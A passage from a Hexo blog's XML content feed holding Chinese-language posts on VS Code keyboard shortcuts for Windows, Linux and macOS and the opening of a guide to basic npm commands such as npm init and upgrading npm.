src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> html </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VS Code 快捷方式</title>
      <link href="/2023/07/03/frontend/collection/skill/vs-code-kuai-jie-fang-shi/"/>
      <url>/2023/07/03/frontend/collection/skill/vs-code-kuai-jie-fang-shi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>Visual Studio Code 是目前最流行、最常用的代码编辑器之一，它是开源的并且可以免费使用。它还提供对多种语言和框架的支持。</p><p>注意，这些 Visual Studio Code 快捷方式取自于 VS Code 官方文档。如果某些快捷方式不起作用，可能是由于编辑器或文件格式中的快捷方式发生了变化，或者安装的扩展影响了该快捷方式。</p><p><a name="KwLyN"></a></p><h1 id="一、快捷导航"><a href="#一、快捷导航" class="headerlink" title="一、快捷导航"></a>一、快捷导航<br /><br /></h1><p><a name="NmgAY"></a></p><h2 id="1-搜索文件"><a href="#1-搜索文件" class="headerlink" title="1. 搜索文件"></a>1. 搜索文件</h2><p>当需要搜索特定的文件，当项目很大时，就会耗费大量时间。即使已经知道文件在哪，使用这个快捷键也会很方便，可以轻松打开项目中的文件。<br />●<strong>Windows&#x2F;Linux:</strong> ctrl + P<br />●<strong>macOS:</strong> command + P</p><p><a name="PHL1Z"></a></p><h2 id="2-打开设置"><a href="#2-打开设置" class="headerlink" title="2. 打开设置"></a>2. 打开设置</h2><p>Visual Studio Code 有许多功能和设置，可以根据需要进行更改。此快捷键可以在必要时轻松地打开设置。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+,<br />●<strong>macOS</strong>: command + ,</p><p><a name="KeI6S"></a></p><h2 id="3-切换侧边栏"><a href="#3-切换侧边栏" class="headerlink" title="3. 切换侧边栏"></a>3. 切换侧边栏</h2><p>很多时候，我们需要更多空间来放置需要处理的文件。因此，此快捷键可以方便地在显示或隐藏侧边栏。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+B<br />●<strong>macOS</strong>: command + B</p><p><a name="HHeDq"></a></p><h2 id="4-导航选项卡"><a href="#4-导航选项卡" class="headerlink" title="4. 导航选项卡"></a>4. 导航选项卡</h2><p>当打开了许多选项卡并且需要在它们之间进行切换时，就可以使用这个快捷键，它会显示选项卡列表并在它们之间导航，我们可以选择要打开的选项卡。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+shift+tab<br />●<strong>macOS</strong>: control + shift + tab</p><p><a name="fecjz"></a></p><h2 id="5-导航选项卡组"><a href="#5-导航选项卡组" class="headerlink" title="5. 导航选项卡组"></a>5. 导航选项卡组</h2><p>Visual Studio Code 提供了创建选项卡组功能。选项卡组允许我们将选项卡分组，每个选项卡组会占屏幕的一部分。使用该快捷键可以在不同的选项卡组进行切换。如果在快捷方式中选择的选项卡组大于当前打开的组数，此快捷键就会创建一个新组。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + 1 或 2 或 3<br />●<strong>macOS</strong>：command + 1 或 2 或 3</p><p><a name="zGQkT"></a></p><h2 id="6-打开终端"><a href="#6-打开终端" class="headerlink" title="6. 打开终端"></a>6. 打开终端</h2><p>在开发过程中，会经常使用终端。Visual Studio Code 允许我们在编辑器内打开终端窗口。这样就无需在编辑器和终端之间切换了，让我们可以专注于编辑器和代码。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+J<br />●<strong>macOS</strong>: command + J</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643796979320-219205b2-8304-4828-9912-b0ab5312bcb2.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643796979320-219205b2-8304-4828-9912-b0ab5312bcb2.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="bvbSQ"></a></p><h2 id="7-打开命令面板"><a href="#7-打开命令面板" class="headerlink" title="7. 打开命令面板"></a>7. 打开命令面板</h2><p>我们可以在 Visual Studio Code 中执行许多命令。使用这个快捷键可以轻松打开命令面板。命令面板允许搜索可以使用的命令并执行它们。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+shift+P<br />●<strong>macOS</strong>: command + shift + P</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643797013465-83a1b897-08a9-443c-8aa0-3463d22ea94f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643797013465-83a1b897-08a9-443c-8aa0-3463d22ea94f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="tHIzO"></a></p><h1 id="二、快捷选择"><a href="#二、快捷选择" class="headerlink" title="二、快捷选择"></a>二、快捷选择<br /><br /></h1><p>在开发过程中，经常需要在代码中进行选择，包括复制、剪切等操作。与其使用鼠标进行操作，不如使用键盘进行操作可以节省时间。这些快捷键专注于快速做出选择。</p><p><a name="o1MsL"></a></p><h2 id="1-选择当前行"><a href="#1-选择当前行" class="headerlink" title="1. 选择当前行"></a>1. 选择当前行</h2><p>可以使用这个快捷键来快速选择光标所在行的整行代码。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+L<br />●<strong>macOS</strong>: command + L</p><p><a name="zt7TE"></a></p><h2 id="2-当前选择"><a href="#2-当前选择" class="headerlink" title="2. 当前选择"></a>2. 当前选择</h2><p>使用此快捷键只需选中一次要查找的文本，就可以在文件中选中所有这个文本，这样就可以同时编辑这些文本了。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + shift + L<br />●<strong>macOS</strong> : command + shift + L</p><p><a name="N2awm"></a></p><h2 id="3-当前单词"><a href="#3-当前单词" class="headerlink" title="3. 当前单词"></a>3. 当前单词</h2><p>此快捷键会执行与上面快捷键相同的操作，但无需选择任何内容。当光标放在一个词上时，按此快捷键就可以选择这个单词在当前文件中的所有的位置。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+F2<br />●<strong>macOS</strong>: command + F2 + fn</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643798234089-47cc9d7e-a64f-45ba-b879-d3daa75f0480.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643798234089-47cc9d7e-a64f-45ba-b879-d3daa75f0480.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="YJb2E"></a></p><h2 id="4-选择直到单词的结尾"><a href="#4-选择直到单词的结尾" class="headerlink" title="4. 选择直到单词的结尾"></a>4. 选择直到单词的结尾</h2><p>选择代码的某部分时，可以移动和扩展此快捷方式的选择。可以使用右箭头或左箭头朝想要的方向前进。<br />●<strong>Windows&#x2F;Linux</strong> : shift + alt + → 或 ←<br />●<strong>macOS</strong> : shift + option + → 或 ←</p><p><a name="mgcFX"></a></p><h2 id="5-通过拖动鼠标选择多行代码"><a href="#5-通过拖动鼠标选择多行代码" class="headerlink" title="5. 通过拖动鼠标选择多行代码"></a>5. 通过拖动鼠标选择多行代码</h2><p>将光标拖过代码就会从头到尾选择每一行。但是也可以使用此快捷来选择部分代码行，但只能选择拖动的多行代码。<br />●<strong>Windows&#x2F;Linux</strong> : shift + alt + 拖动光标<br />●<strong>macOS</strong> : shift + option + 拖动光标</p><p><a name="yeyY4"></a></p><h2 id="6-使用箭头键选择多行代码"><a href="#6-使用箭头键选择多行代码" class="headerlink" title="6. 使用箭头键选择多行代码"></a>6. 使用箭头键选择多行代码</h2><p>使用该快捷键也可以执行上述操作，但无需使用鼠标，而是使用键盘上的箭头键。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + shift + alt + → 或 ← 或 ↓ 或 ↑<br />●<strong>macOS</strong> : command + shift + option + → 或 ← 或 ↓ 或 ↑</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643800279713-09959e79-a423-4d3b-bea1-47e7c8b58c98.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643800279713-09959e79-a423-4d3b-bea1-47e7c8b58c98.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="zOhP2"></a></p><h1 id="三、快捷查找"><a href="#三、快捷查找" class="headerlink" title="三、快捷查找"></a>三、快捷查找<br /><br /></h1><p>所有编辑器都具有查找功能，以便可以在当前文件或多个文件中查找某些单词，例如函数或变量名称、短语或代码块等。下面就来看看查找功能相关的快捷键。</p><p><a name="zb5oU"></a></p><h2 id="1-结果导航"><a href="#1-结果导航" class="headerlink" title="1. 结果导航"></a>1. 结果导航</h2><p>可以使用此快捷键在文件中的查找结果之间进行移动。<br />●<strong>Windows&#x2F;Linux</strong>：F3<br />●<strong>macOS</strong>：F3 + fn</p><p><a name="hFq6f"></a></p><h2 id="2-选择多个结果"><a href="#2-选择多个结果" class="headerlink" title="2. 选择多个结果"></a>2. 选择多个结果</h2><p>如果想要修改多个搜索结果，就可以使用此快捷键在文件中选择查找结果中的多个内容，每次按下此键后都会选择一个结果，然后就会按搜索结果的顺序进行选中。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + D<br />●<strong>macOS</strong> : command + D</p><p><a name="lcbi3"></a></p><h2 id="3-选择所有结果"><a href="#3-选择所有结果" class="headerlink" title="3. 选择所有结果"></a>3. 选择所有结果</h2><p>如果想使用查找功能对所有查找结果进行修改，则此快捷键就可以选择所有查找结果。<br />●<strong>Windows&#x2F;Linux</strong>:alt+enter<br />●<strong>macOS</strong>: option + enter</p><p><a name="u6uqC"></a></p><h1 id="四、代码导航"><a href="#四、代码导航" class="headerlink" title="四、代码导航"></a>四、代码导航<br /><br /></h1><p>随着文件或项目变得复杂，找到代码的某些部分就变得越来越困难。手动查找错误或转到某一行代码可能比较困难。下面这些快捷键就可以省去很多麻烦，让我们将更多时间投入到真正想做的事情上。</p><p><a name="d9Tw2"></a></p><h2 id="1-跳转指定行"><a href="#1-跳转指定行" class="headerlink" title="1. 跳转指定行"></a>1. 跳转指定行</h2><p>当遇到指定一行代码导致编译或运行时错误时，就可以使用该快捷键跳转到这一行代码，只需按下这个快捷键，输入代码行数，按下回车即可跳转到这行代码。当一个文件中代码特别多时，这个快捷键就非常有用。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+G<br />●<strong>macOS</strong>: control + G</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643802227790-1d79f8aa-3758-4528-8e8d-ac66cc28592c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643802227790-1d79f8aa-3758-4528-8e8d-ac66cc28592c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="LOr6R"></a></p><h2 id="2-转到匹配的括号"><a href="#2-转到匹配的括号" class="headerlink" title="2. 转到匹配的括号"></a>2. 转到匹配的括号</h2><p>我们可能会需要查找匹配代码块的右括号。当文件很长时，就很困难了。使用此快捷键可以轻松找到当前块的右匹配括号。在 HTML 标签中，它可以移动到当前标签的末尾。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + shift + &lt;br &#x2F;&gt;●<strong>macOS</strong> : command + shift + \</p><p><a name="TQVcD"></a></p><h2 id="3-折叠-x2F-展开代码块"><a href="#3-折叠-x2F-展开代码块" class="headerlink" title="3. 折叠&#x2F;展开代码块"></a>3. 折叠&#x2F;展开代码块</h2><p>在包含大量代码的文件时，我们可以折叠（隐藏）当前不关注的某个代码块，以便可以专注于其他内容。此快捷键就是用来折叠或展开代码块的。单击代码块中的任意位置，然后按以下键即可。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + shift + [或]<br />●<strong>macOS</strong> : command + option + [或]</p><p><a name="QY3Ks"></a></p><h2 id="4-折叠-x2F-展开代码块和子代码块"><a href="#4-折叠-x2F-展开代码块和子代码块" class="headerlink" title="4. 折叠&#x2F;展开代码块和子代码块"></a>4. 折叠&#x2F;展开代码块和子代码块</h2><p>如果代码块包含子代码块怎么办？使用上面的命令将会折叠父代码块，但当父代码块展开时，子代码块将保持不变。如果需要折叠和展开一个代码块及其子代码块，可以使用此快捷键来完成。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + K + [或]<br />●<strong>macOS</strong> : command + K + [或]</p><p><a name="SJKQZ"></a></p><h2 id="5-导航到错误和警告处"><a href="#5-导航到错误和警告处" class="headerlink" title="5. 导航到错误和警告处"></a>5. 导航到错误和警告处</h2><p>在代码中查找出现错误和警告的代码至关重要。此快捷键省去了滚动以找到确切问题的麻烦。它可以直接转到下一个错误或警告处。<br />●<strong>Windows&#x2F;Linux</strong>：F8<br />●<strong>macOS</strong>：F8 + fn</p><p><a name="P5oU3"></a></p><h1 id="五、移动光标"><a href="#五、移动光标" class="headerlink" title="五、移动光标"></a>五、移动光标<br /><br /></h1><p>在很多情况下，可能需要有多个光标，每个光标位于文件中的不同位置。这些快捷键有助于更轻松地使用多个光标进行移动。</p><p><a name="fwnXo"></a></p><h2 id="1-特定位置插入额外光标"><a href="#1-特定位置插入额外光标" class="headerlink" title="1. 特定位置插入额外光标"></a>1. 特定位置插入额外光标</h2><p>此键盘快捷键可以在文件中任何位置插入一个额外的光标。<br />●<strong>Windows&#x2F;Linux</strong> : alt + 鼠标点击位置<br />●<strong>macOS</strong>：option + 鼠标点击位置</p><p><a name="dgeOZ"></a></p><h2 id="2-上方或下方插入额外光标"><a href="#2-上方或下方插入额外光标" class="headerlink" title="2. 上方或下方插入额外光标"></a>2. 上方或下方插入额外光标</h2><p>插入光标的第二种方法是将其插入在当前光标位置的上方或下方。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + alt +↓ 或 ↑<br />●<strong>macOS</strong> : command + option +↓ 或 ↑</p><p><a name="cSgdv"></a></p><h2 id="3-撤销光标插入"><a href="#3-撤销光标插入" class="headerlink" title="3. 撤销光标插入"></a>3. 撤销光标插入</h2><p>如果错误地插入了光标，或者不再需要在该位置插入光标怎么办？此快捷键可以撤消上次插入的光标。当插入多个光标时，这个快键键将非常有用，因为它可以将其他光标保持在原位并删除最后插入的光标。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + U<br />●<strong>macOS</strong> : command + U</p><p><a name="o6TFS"></a></p><h2 id="4-在选中代码的末尾插入光标"><a href="#4-在选中代码的末尾插入光标" class="headerlink" title="4. 在选中代码的末尾插入光标"></a>4. 在选中代码的末尾插入光标</h2><p>使用该快捷键可以在选中代码的每一行的最后插入光标。<br />●<strong>Windows&#x2F;Linux</strong> : shift + alt + I<br />●<strong>macOS</strong> : shift + option + I</p><p><a name="ojnxK"></a></p><h1 id="六、快捷编码"><a href="#六、快捷编码" class="headerlink" title="六、快捷编码"></a>六、快捷编码<br /><br /></h1><p><a name="eWoAa"></a></p><h2 id="1-移动代码行或代码块"><a href="#1-移动代码行或代码块" class="headerlink" title="1. 移动代码行或代码块"></a>1. 移动代码行或代码块</h2><p>很多时候需要将一条行或多行代码从一个位置移动到另一个位置。此快捷键并不是复制或剪切并将代码粘贴到另一个位置，而是提供了一种更快的解决方案，只需将光标放在该代码行上。如果想移动多行代码，只需先选中需要移动的代码，再使用该快捷键即可。<br />●<strong>Windows&#x2F;Linux</strong> : alt +↓ 或 ↑<br />●<strong>macOS</strong>：option +↓ 或 ↑</p><p><a name="It0Uv"></a></p><h2 id="2-复制代码行或代码块"><a href="#2-复制代码行或代码块" class="headerlink" title="2. 复制代码行或代码块"></a>2. 复制代码行或代码块</h2><p>如果需要复制一行或多行代码并将其粘贴到下方或上方怎么办？这个快捷键不必实际复制和粘贴这些代码，而是根据使用箭头选择的方向在其下方或上方复制该行。如果想复制多行代码，只需先选中需要复制的代码，再使用该快捷键即可。<br />●<strong>Windows&#x2F;Linux</strong> : shift + alt +↓ 或 ↑<br />●<strong>macOS</strong> : shift + option +↓ 或 ↑</p><p><a name="ru6vh"></a></p><h2 id="3-代码缩进"><a href="#3-代码缩进" class="headerlink" title="3. 代码缩进"></a>3. 代码缩进</h2><p>当将代码从一个位置复制到另一个位置时，或者更改代码时，很多时候代码会出现错误的缩进。这个快捷键就可以根据需要缩进代码，也可以选择多行代码将它们一起移动。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + [或]<br />●<strong>macOS</strong>：command + [或]</p><p><a name="EvfVS"></a></p><h2 id="4-切换代码注释"><a href="#4-切换代码注释" class="headerlink" title="4. 切换代码注释"></a>4. 切换代码注释</h2><p>使用该快捷键可以注释或取消注释光标所在行代码。如果想要注释或取消注释多行代码，只需要先选中多行代码即可。<br />●<strong>Windows&#x2F;Linux</strong>:ctrl+&#x2F;<br />●<strong>macOS</strong>: command + &#x2F;</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643806091174-21cf7743-175e-472a-824d-74f9c88ac2d5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643806091174-21cf7743-175e-472a-824d-74f9c88ac2d5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="qcLPq"></a></p><h2 id="5-切换代码块注释"><a href="#5-切换代码块注释" class="headerlink" title="5. 切换代码块注释"></a>5. 切换代码块注释</h2><p>与上面的快捷键不同，下面的快捷键会将选中的多行代码注释为单个注释。<br />●<strong>Windows&#x2F;Linux</strong> : shift + alt + A<br />●<strong>macOS</strong> : shift + option + A</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643806130754-9f6aad1b-0272-4b6f-9c7d-a977bbd82011.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643806130754-9f6aad1b-0272-4b6f-9c7d-a977bbd82011.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="OzXqi"></a></p><h2 id="6-代码格式"><a href="#6-代码格式" class="headerlink" title="6. 代码格式"></a>6. 代码格式</h2><p>出于可读性的原因，保持代码指定的格式非常重要。Visual Studio Code 提供了两个用于代码格式化的快捷命令。</p><p>下面快捷键可以格式化整个文件中的代码：<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + shift + F<br />●<strong>macOS</strong> : option + shift + F</p><p>下面快捷键可以格式化已选中的代码：<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + K，然后 ctr l+ F<br />●<strong>macOS</strong> : command + K，然后 command + F</p><p><a name="jh30T"></a></p><h2 id="7-快速修复错误"><a href="#7-快速修复错误" class="headerlink" title="7. 快速修复错误"></a>7. 快速修复错误</h2><p>在很多情况下，如果出现一个常见或简单的错误，Visual Studio Code 可以直接修复它——例如缺少分号。如果快速修复可以使用，则此该快捷键可以快速修复错误或警告。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + .<br />●<strong>macOS</strong> : command + .</p><p><a name="ByQ7f"></a></p><h2 id="8-重命名"><a href="#8-重命名" class="headerlink" title="8. 重命名"></a>8. 重命名</h2><p>如果手动重命名多次使用的变量、函数或类就很容易出错。此快捷键提供了一种重命名任何符号的安全方法。<br />●<strong>Windows&#x2F;Linux</strong>：F2<br />●<strong>macOS</strong>：F2 + fn</p><p><a name="Fb9wf"></a></p><h2 id="9-删除空白"><a href="#9-删除空白" class="headerlink" title="9. 删除空白"></a>9. 删除空白</h2><p>可以使用以下快捷键来删除多余的空行：<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + K + X<br />●<strong>macOS</strong> : command + K + X</p><p>注意：需要一直按着 ctrl 或 command 键，然后先按 K 键，再按 X 键。</p><p><a name="Gk1Yv"></a></p><h2 id="10-更改编程语言"><a href="#10-更改编程语言" class="headerlink" title="10. 更改编程语言"></a>10. 更改编程语言</h2><p>默认情况下，Visual Studio Code 会检测正在处理的文件所用的编程语言。通常，它是通过检查文件的扩展名来完成的。但是，如果不支持文件的扩展名，就可能无法正确检测语言。因此，当需要更改文件的编程语言，可以使用此快捷键。<br />●<strong>Windows&#x2F;Linux</strong> : ctrl + K, 然后按 M<br />●<strong>macOS</strong> : command + K，然后按 M</p><p><a name="TsFha"></a></p><h1 id="七、更好的编码"><a href="#七、更好的编码" class="headerlink" title="七、更好的编码"></a>七、更好的编码<br /><br /></h1><p><a name="gj0Wq"></a></p><h2 id="1-转到定义"><a href="#1-转到定义" class="headerlink" title="1. 转到定义"></a>1. 转到定义</h2><p>很多时候，我们需要了解正在使用的代码的定义是怎样的。比如调用一个函数时，想知道这个函数是如何定义的，就可以使用这个快捷键。<br />●<strong>Windows&#x2F;Linux</strong>：F12<br />●<strong>macOS</strong>：F12 + fn</p><p><a name="GLMyE"></a></p><h2 id="2-查看定义"><a href="#2-查看定义" class="headerlink" title="2. 查看定义"></a>2. 查看定义</h2><p>此快捷键可以在检查定义的地方打开定义。这样可以更轻松地查看定义，而无需切换到另一个文件或代码行。<br />●<strong>Windows&#x2F;Linux</strong> : alt + F12<br />●<strong>macOS</strong> : option + F12 + fn</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643808122089-e8c9c0f1-f296-454c-b9bb-e54100f7dbb0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643808122089-e8c9c0f1-f296-454c-b9bb-e54100f7dbb0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="KMN3k"></a></p><h2 id="3-切换建议"><a href="#3-切换建议" class="headerlink" title="3. 切换建议"></a>3. 切换建议</h2><p>在编写代码时，VS Code 或者一些扩展会展示代码建议。此快捷键可以快速切换代码建议以查看或隐藏它们。<br />●<strong>Windows&#x2F;Linux</strong>: ctrl + I<br />●<strong>macOS</strong> : command + I</p><p>VS Code 是目前最好用的代码编辑器之一。它提供了许多开箱即用的功能以及丰富的第三方扩展，在 VS Code 中使用快捷键可以使开发更加轻松，让我们可以专注于在更短的时间编写高质量的代码。本文介绍了一些实用的 Visual Studio Code 快捷键，希望能帮助你提高开发效率！</p><p>最后，附上在 Windows、Linux、macOS 系统中 VS Code 的快捷键：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643809703950-9bf2abee-6e0d-448b-bcc2-d83b483c0361.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1643809703950-9bf2abee-6e0d-448b-bcc2-d83b483c0361.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> IDE </tag>
            
            <tag> 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm 使用技巧</title>
      <link href="/2023/07/03/frontend/collection/skill/npm-shi-yong-ji-qiao/"/>
      <url>/2023/07/03/frontend/collection/skill/npm-shi-yong-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>今天总结了 npm 常用的一些命令分享给大家，希望对你有所帮助！</p><p><a name="OGWcb"></a></p><h2 id="1-npm-基本概念"><a href="#1-npm-基本概念" class="headerlink" title="1. npm 基本概念"></a>1. npm 基本概念</h2><p>npm 全称为 Node Package Manager，是一个基于 Node.js 的包管理器，也是 Node.js 社区最流行、支持的第三方模块最多的包管理器。它的初衷就是让开发人员更容易分享和重用代码。npm 提供了命令行工具，其主要功能是管理 Node.js 包，包括安装、更新、删除、查看、搜索、发布等。</p><p>npm 最初只是 Node.js 的包管理器，但随着前端技术的不断发展，它的定位变成了广义的包管理器，可以实现 JavaScript、React、Vue、Gulp、移动开发等包管理，是目前最大、生态最为健全的包管理器。</p><p>npm 能解决 Node.js 在模块管理上的很多问题，其常见的应用场景如下：<br />● 从 npm 镜像服务器下载第三方模块；<br />● 从 npm 镜像服务器下载并安装命令行程序到本地；<br />● 自己发布模块到 npm 镜像服务器供他人使用。</p><p>npm 不需要单独安装，在安装 Node.js 时，就会连带着一起安装 npm 了。但是安装的 npm 不一定是最新的版本，可以使用以下命令来查看本地 npm 的版本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm -v</span><br></pre></td></tr></table></figure><p><br />这里的 -v 是 –version 的缩写，表示版本。如果想升级 npm 版本，可以使用以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install npm@latest -g</span><br></pre></td></tr></table></figure><p><br />这里@latest 表示最新的版本，-g 是 –global 的缩写，表示全局安装。</p><p>除此之外，还可以使用 help 命令来查看 npm 帮助：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm 命令 --help</span><br></pre></td></tr></table></figure><p><br />比如查看 install 的参数形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --help</span><br></pre></td></tr></table></figure><p><br />其中–help 可以简写为-h，上面命令的执行结果如下，可以看到 install 命令的很多形式：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636559933376-22dac189-dfa3-4180-9f18-fbc81befc377.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636559933376-22dac189-dfa3-4180-9f18-fbc81befc377.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>常见的 npm 命令：</p><p><img src="https://img1.imgtp.com/2023/07/11/pZAMrRS6.png" class="lazyload placeholder" data-srcset="https://img1.imgtp.com/2023/07/11/pZAMrRS6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>说完这些概念，下面就来看看 npm 在使用时有哪些实用的技巧。</p><p><a name="ovoAJ"></a></p><h2 id="2-初始化-package"><a href="#2-初始化-package" class="headerlink" title="2. 初始化 package"></a>2. 初始化 package</h2><p>凡是使用 npm 管理的项目，都需要初始化一个 package.json 文件。</p><p>可以使用以下命令来初始化一个包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p><br />当执行这个命令时，它会通过问答的形式来一步步进行设置。如果不需要修改默认的配置，直接一路回车即可。如果想跳过向导，快速生成一个 package.json 文件，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init --yes</span><br></pre></td></tr></table></figure><p><br />其中，–yes 可以简写为-y。这时生成的 package.json 文件的配置项就是 npm 的默认配置。当然这个默认配置也是可以更改的，可以通过类似下面这样的形式来修改 npm 